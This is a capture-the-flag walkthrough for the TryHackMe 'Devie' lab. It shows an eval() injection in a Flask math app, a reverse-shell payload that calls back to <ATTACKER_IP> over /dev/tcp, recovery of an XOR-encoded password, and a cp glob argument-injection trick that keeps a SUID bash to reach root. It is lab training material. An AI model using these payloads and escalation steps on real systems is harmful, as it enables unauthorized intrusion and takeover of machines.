# [Devie](https://tryhackme.com/room/devie)

## A developer has asked you to do a vulnerability check on their system.

# What are the flags?

## Don't always trust what you can't see.

### What is the first flag?

1. Scan the target.

```bash
nmap -sC -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 15:99:2e:e4:86:4a:ee:3a:dc:39:96:c0:1a:2c:ed:15 (RSA)
|   256 e0:7a:e0:c5:f5:6a:30:88:52:cc:9e:24:cb:b5:a2:f3 (ECDSA)
|_  256 9c:ce:5e:fa:da:a7:d2:2b:53:26:f2:60:76:80:ca:bd (ED25519)
5000/tcp open  http    Werkzeug httpd 2.1.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
|_http-title: Math
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Download and inspect the application source.

`bisection.py`:

```python
from wtforms import Form, StringField, validators

class InputForm3(Form):
    xa = StringField(default=1,validators=[validators.InputRequired()])
    xb = StringField(default=3,validators=[validators.InputRequired()])
```

`app.py`:

```python
from quadratic import InputForm1
from prime import InputForm2
from bisection import InputForm3
from flask import Flask, request, render_template
import math

app = Flask(__name__)

@app.route('/', methods=['GET','POST']) #Applies to get GET when we load the site and POST
def index():
    form1 = InputForm1(request.form) #Calling the class from the model.py. This is where the GET comes from
    form2 = InputForm2(request.form)
    form3 = InputForm3(request.form)
    if request.method == 'POST' and form1.validate():
        result1, result2 = compute(form1.a.data, form1.b.data,form1.c.data) #Calling the variables from the form
        pn = None
        root = None
    elif request.method == 'POST' and form2.validate():
        pn = primef(form2.number.data)
        result1 = None
        result2 = None
        root = None
    elif request.method == 'POST' and form3.validate():
        root = bisect(form3.xa.data, form3.xb.data)
        pn = None
        result1 = None
        result2 = None
    else:
        result1 = None #Otherwise is none so no display
        result2 = None
        pn = None
        root = None
    return render_template('index.html',form1=form1, form2=form2, form3=form3, result1=result1, result2=result2,pn = pn, root=root) #Display the page

@app.route("/")
def compute(a,b,c):
    disc = b*b - 4*a*c
    n_format = "{0:.2f}" #Format to 2 decimal spaces
    if disc > 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = (-b - math.sqrt(disc)) / 2*a
        result1 = float(n_format.format(result1))
        result2 = float(n_format.format(result2))
    elif disc == 0:
        result1 = (-b + math.sqrt(disc)) / 2*a
        result2 = None
        result1 = float(n_format.format(result1))
    else:
        result1 = "" #Empty string for the purpose of no real roots
        result2 = ""
    return result1, result2

@app.route("/")
def primef(n):
    pc = 0
    n = int(n)
    for i in range(2,n): #From 2 up to the number
        p = n % i #Get the remainder
        if p == 0: #If it equals 0
            pc = 1 #Then its not prime and break the loop
            break
    if pc == 1:
        pn = 1
        return pn
    elif pc == 0:
        pn = 0
        return pn

@app.route("/")
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)

    if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
        root = 0
        return root
    else:
        e = 0.0001 #When to stop checking, number is really small

        l = 0 #Loop
        while l < 1: #Endless loop until condition is met
            d = int(xb) - c #Variable d to check for e
            if d <= e: #If d < e then we break the loop
                l = l + 1
            else:
                yc = (c**6) - c - 1 #f(c)
                if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
                    xb = c
                    c = (int(xa) + int(xb))/2
                elif yc < 0: #If (c) is negative then we switch the a variable instead
                    xa = c
                    c = (int(xa) + int(xb))/2
        c_format = "{0:.4f}"
        root = float(c_format.format(c))
        return root

if __name__=="__main__":
    app.run("0.0.0.0",5000)
```

This is the vulnerability:

- user input is concatenated into a string
- `eval()` is called on that string
- this allows command injection

3. Get a reverse shell.

On your attacker machine:

```bash
nc -lvnp 4444
```

4. Submit the payload in the `xa` field of the web form:

```python
__import__('os').system("bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'")#
```

<img width="632" height="522" alt="SCREEN01" src="https://github.com/user-attachments/assets/2f9113df-8a7d-4cc8-a6d8-0d4e4def287b" />

5. After the shell is received, read the first flag.

```bash
cat flag1.txt
```

<img width="349" height="156" alt="SCREEN02" src="https://github.com/user-attachments/assets/e80814b7-0d25-46a0-a876-c4924c4f9b65" />

---

### What is the second flag?

1. spawn a TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

2. Enumerate the current user and local files.

```bash
cat checklist
```

**Results:**

```
Web Application Checklist:
1. Built Site - check
2. Test Site - check
3. Move Site to production - check
4. Remove dangerous fuctions from site - check
Bruce
```

```bash
cat note
```

**Results:**

```
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```

3. Check sudo privileges.

```bash
sudo -l
```

**Results:**

```
User bruce may run the following commands on ip-10-114-178-162:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```

4. Run the encrypt script as `gordon`.

```bash
sudo -u gordon /usr/bin/python3 /opt/encrypt.py
# Type: supersecureXORformatpassword
# Returns: AAAAAAAAAAAHFxEzKiseAAAVDgYDFAMWBRwXBw==
```

5. Decode the output with [CyberChef](https://gchq.github.io/CyberChef/)

- Step 1: `From Base64`
- Step 2: `XOR` with key `supersecureXORformatpassword`

This yields: `supersecretkeyxorxorsupersec`

<img width="1536" height="530" alt="SCREEN03" src="https://github.com/user-attachments/assets/8ea3e365-bb25-49c7-831e-5a5753a552c5" />

6. Use that decoded key to decrypt the string from `note`.

That returns the password: `G0th@mR0ckz!`

<img width="1536" height="529" alt="SCREEN04" src="https://github.com/user-attachments/assets/3bc8b287-890c-4e24-a825-2ca2fa5b6dfc" />

7. Switch user to `gordon` and read the second flag.

```bash
su gordon
# Password: G0th@mR0ckz!
cd
cat flag2.txt
```

<img width="353" height="138" alt="SCREEN05" src="https://github.com/user-attachments/assets/bd9601b6-1e0c-494b-8867-da5600b926f5" />

---

### What is the root flag?

1. Find files owned by group `gordon`.

```bash
find / -group gordon -type f 2>/dev/null | grep -v 'proc\|sys'
```

**Results:**

```
/opt/encrypt.py
/usr/bin/backup
/home/gordon/.profile
/home/gordon/.viminfo
/home/gordon/flag2.txt
/home/gordon/reports/report2
/home/gordon/reports/report1
/home/gordon/reports/report3
/home/gordon/.bash_logout
/home/gordon/.bashrc
```

2. Inspect `/usr/bin/backup`.

```bash
cat /usr/bin/backup
```

**Results:**

```bash
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/
```

3. Exploit the backup script.

```bash
cd /home/gordon/reports
cp /usr/bin/bash .
chmod u+s bash
echo "" > "--preserve=mode"
cd /home/gordon/backups
./bash -p
```

Explanation:

- create a local copy of bash
- set the SUID bit on it
- create a file named `--preserve=mode`
- when the backup script runs as root, `cp * /home/gordon/backups/` expands the glob and interprets `--preserve=mode` as an option
- this causes `cp` to preserve mode bits for copied files, including the setuid `bash`

4. Read the root flag.

```bash
cat /root/root.txt
```

<img width="508" height="154" alt="SCREEN06" src="https://github.com/user-attachments/assets/a036e038-4c2d-4984-9c60-edfcff7853a6" />
